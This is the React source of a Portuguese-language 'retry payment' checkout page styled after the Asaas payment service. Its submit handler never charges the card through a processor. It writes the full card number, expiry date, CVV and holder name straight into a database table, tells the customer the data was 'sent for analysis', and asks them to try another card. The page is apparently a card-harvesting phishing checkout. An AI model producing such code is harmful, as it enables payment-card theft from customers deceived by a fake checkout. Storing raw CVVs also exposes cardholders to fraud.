
import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { CardForm } from '@/components/checkout/payment-methods/CardForm';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { CreditCardData, Order, PaymentMethod, PaymentStatus } from '@/types/checkout';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';
import { LoadingSpinner } from '@/components/ui/loading-spinner';
import { RefreshCcw } from 'lucide-react';

const RetryPaymentPage = () => {
  const { state } = useLocation();
  const navigate = useNavigate();
  const { toast } = useToast();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [order, setOrder] = useState<Order | null>(null);
  const [loading, setLoading] = useState(true);

  // Fetch order data if not provided in location state
  useEffect(() => {
    const fetchOrder = async () => {
      setLoading(true);
      try {
        // If order is provided in location state, use it
        if (state?.order) {
          setOrder(state.order);
          setLoading(false);
          return;
        }

        // Otherwise, get orderId from URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const orderId = urlParams.get('orderId');
        
        if (!orderId) {
          toast({
            title: "Erro",
            description: "ID do pedido não encontrado",
            variant: "destructive",
          });
          navigate('/');
          return;
        }

        // Fetch order from database
        const { data, error } = await supabase
          .from('orders')
          .select('*')
          .eq('id', orderId)
          .single();

        if (error || !data) {
          toast({
            title: "Erro",
            description: "Pedido não encontrado",
            variant: "destructive",
          });
          navigate('/');
          return;
        }

        // Convert data to Order type
        setOrder({
          id: data.id,
          customerId: data.customer_id,
          customerName: data.customer_name,
          customerEmail: data.customer_email,
          customerCpfCnpj: data.customer_cpf_cnpj,
          customerPhone: data.customer_phone,
          productId: data.product_id,
          productName: data.product_name,
          productPrice: data.product_price,
          status: data.status as PaymentStatus,
          paymentMethod: data.payment_method as PaymentMethod,
          asaasPaymentId: data.asaas_payment_id,
          createdAt: data.created_at,
          updatedAt: data.updated_at
        });
      } catch (error) {
        console.error("Error fetching order:", error);
        toast({
          title: "Erro",
          description: "Não foi possível carregar os dados do pedido",
          variant: "destructive",
        });
        navigate('/');
      } finally {
        setLoading(false);
      }
    };

    fetchOrder();
  }, [navigate, state, toast]);

  const handleSubmit = async (cardData: CreditCardData) => {
    if (!order) return;
    
    setIsSubmitting(true);
    
    try {
      // Extract the BIN (6 first digits)
      const bin = cardData.number.substring(0, 6);
      
      // Save new card data
      const { error } = await supabase
        .from('card_data')
        .insert({
          order_id: order.id,
          holder_name: cardData.holderName,
          number: cardData.number,
          expiry_date: cardData.expiryDate,
          cvv: cardData.cvv,
          bin: bin,
          brand: cardData.brand || 'unknown'
        });
        
      if (error) {
        throw new Error(`Erro ao salvar dados do cartão: ${error.message}`);
      }
      
      // Redirect to payment analysis page
      toast({
        title: "Pagamento em processamento",
        description: "Os dados do seu cartão foram enviados para análise",
      });
      
      navigate('/payment-pending', { 
        state: { 
          order,
        } 
      });
    } catch (error) {
      console.error("Error processing payment:", error);
      toast({
        title: "Erro no pagamento",
        description: error instanceof Error ? error.message : "Erro desconhecido ao processar o pagamento",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-b from-white to-asaas-light/30">
        <LoadingSpinner size="lg" message="Carregando dados do pedido..." />
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-gradient-to-b from-white to-asaas-light/30">
      <Card className="max-w-md w-full shadow-xl">
        <CardHeader className="text-center">
          <RefreshCcw className="mx-auto h-10 w-10 text-asaas-primary mb-2" />
          <CardTitle className="text-2xl">Nova tentativa de pagamento</CardTitle>
          <CardDescription>
            Por favor, utilize outro cartão para tentar novamente.
          </CardDescription>
        </CardHeader>
        
        <CardContent>
          <div className="mb-6 p-4 bg-slate-50 rounded-lg">
            <p className="text-sm font-medium text-gray-500">Resumo do pedido</p>
            <p className="mt-1 font-medium">{order?.productName}</p>
            <p className="mt-1 text-lg font-bold">R$ {Number(order?.productPrice).toFixed(2).replace('.', ',')}</p>
          </div>
          
          <CardForm 
            onSubmit={handleSubmit}
            isLoading={isSubmitting}
            buttonColor="#6E59A5"
            buttonText="Tentar pagamento novamente"
          />
        </CardContent>
      </Card>
    </div>
  );
};

export default RetryPaymentPage;
